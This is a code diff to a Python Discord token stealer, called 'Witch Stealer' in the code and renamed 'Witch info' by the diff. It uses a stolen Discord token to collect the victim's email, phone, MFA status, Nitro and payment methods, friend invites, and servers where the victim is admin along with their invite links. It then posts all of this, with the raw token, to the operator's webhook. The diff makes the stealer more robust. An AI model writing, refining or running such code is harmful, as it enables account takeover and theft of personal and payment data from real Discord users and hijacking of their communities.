@@ -114,6 +114,9 @@ def decrypt_value(encrypted_value: bytes, master_key: bytes) -> str:
         pass
     return ""
 
+import requests
+import json
+
 def tokens(token: str):
     headers = {
         "Authorization": token,
@@ -154,7 +157,9 @@ def tokens(token: str):
         public_flags = user.get("public_flags", 0)
         avatar_hash = user.get("avatar")
         lang = user.get("locale")
-        friendinvite = requests.post("https://discord.com/api/v9/users/@me/invites", headers=headers)
+
+        friendinvite_res = requests.post("https://discord.com/api/v9/users/@me/invites", headers=headers)
+        friendinvite_code = friendinvite_res.json().get('code', 'None') if friendinvite_res.ok else 'None'
 
         user_badges = [name for bit, name in BADGES.items() if public_flags & bit]
         avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png" if avatar_hash else None
@@ -167,10 +172,7 @@ def tokens(token: str):
             3: "Basic Nitro"
         }.get(premium_type, "Unknown")
 
-        if user.get("mfa_enabled", False) == True:
-            mfa = ":white_check_mark: "
-        elif user.get("mfa_enabled", False) == False:
-            mfa = ":x: "
+        mfa = ":white_check_mark:" if user.get("mfa_enabled", False) else ":x:"
 
         methods = "❌"
         try:
@@ -186,59 +188,88 @@ def tokens(token: str):
         except:
             pass
 
-        guilds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers={'Authorization': token}).json()
+        guilds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=headers).json()
 
-        if guilds:
-                hq_guilds = []
-                for guild in guilds:
-                    admin = True if guild['permissions'] == '0x8' else False
-                    if admin and guild['approximate_member_count'] >= 100:
-                        owner = "✅" if guild['owner'] else "❌"
-                        invites = requests.get(
-                            f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers={'Authorization': token}).json()
-                        if len(invites) > 0:
-                            invite = f"https://discord.gg/{invites[0]['code']}"
+        found_guilds = False
+        hq_guilds = []
+
+        if isinstance(guilds, list):
+            for guild in guilds:
+                try:
+                    admin = int(guild['permissions']) & 0x8 == 0x8
+                    if admin:
+                        preview_res = requests.get(
+                            f"https://discord.com/api/v8/guilds/{guild['id']}/preview", headers=headers
+                        )
+                        if preview_res.status_code == 200:
+                            preview = preview_res.json()
+                            approximate_member_count = preview.get('approximate_member_count', 0)
+                            approximate_presence_count = preview.get('approximate_presence_count', 0)
+                        else:
+                            approximate_member_count = 0
+                            approximate_presence_count = 0
+
+                        owner = "✅" if guild.get('owner', False) else "❌"
+
+                        invites_res = requests.get(
+                            f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers=headers
+                        )
+                        if invites_res.status_code == 200:
+                            invites = invites_res.json()
+                            if invites:
+                                invite = f"https://discord.gg/{invites[0]['code']}"
+                                found_guilds = True
+                            else:
+                                invite = "https://youtu.be/dQw4w9WgXcQ"
                         else:
                             invite = "https://youtu.be/dQw4w9WgXcQ"
 
-                        data = f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join Server]({invite})"
+                        data = (
+                            f"\u200b\n**{guild['name']} ({guild['id']})** \n"
+                            f"Owner: `{owner}` | Members: ` ⚫ {approximate_member_count} / 🟢 {approximate_presence_count} / 🔴 {approximate_member_count - approximate_presence_count} `\n"
+                            f"[Join Server]({invite})"
+                        )
 
                         if len('\n'.join(hq_guilds)) + len(data) >= 1024:
                             break
 
                         hq_guilds.append(data)
+                except Exception:
+                    continue
 
-                if len(hq_guilds) > 0:
-                    hq_guilds = '\n'.join(hq_guilds)
+        if hq_guilds:
+            hq_guilds = '\n'.join(hq_guilds)
+        else:
+            hq_guilds = None
 
-                else:
-                    hq_guilds = None
-        # <a:NAME:ID>
         fields = [
             {"name": "TOKEN", "value": f"```{token}```", "inline": False},
             {"name": "Badge", "value": f"-# {', '.join(user_badges) if user_badges else 'None'}", "inline": True},
-            {"name": "MFA", "value": f"{mfa}", "inline": True},
+            {"name": "MFA", "value": mfa, "inline": True},
             {"name": "Nitro", "value": nitro_type, "inline": True},
-            {"name": "Payment", "value": f"{methods}", "inline": True},
+            {"name": "Payment", "value": methods, "inline": True},
             {"name": "TAG", "value": f"```{guild_tag}```", "inline": True},
-            {"name": "Language", "value": f"{lang}", "inline": True},
-            {"name": "Friends Invite", "value": f"https://discord.gg/{friendinvite.json()['code']}", "inline": True},
+            {"name": "Language", "value": lang, "inline": True},
+            {"name": "Friends Invite", "value": f"https://discord.gg/{friendinvite_code}", "inline": True},
             {"name": "Email", "value": f"```{email}```", "inline": False},
             {"name": "Phone", "value": f"```{phone}```", "inline": False},
         ]
 
-        if hq_guilds != None:
+        if found_guilds:
             fields.append({
                 "name": "HQ Guilds",
                 "value": hq_guilds,
                 "inline": False
             })
+            print("found")
+        else:
+            print("No HQ guilds found")
 
         embed = {
-            "username": "Witch Stealer",
+            "username": "Witch info",
             "avatar_url": __CONFIG__["avatar_link"],
             "embeds": [{
-                "title": f"{user_name} ({user_id})",
+                "title": f"{user_name} ({user_id}) info",
                 "color": 0x000000,
                 "fields": fields,
                 "thumbnail": {"url": avatar}
